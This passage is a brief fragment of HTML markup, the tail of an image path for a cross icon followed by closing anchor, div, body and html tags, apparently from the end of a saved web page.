Summary1_files/cross_icon(3).jpg"></a></div></body></html>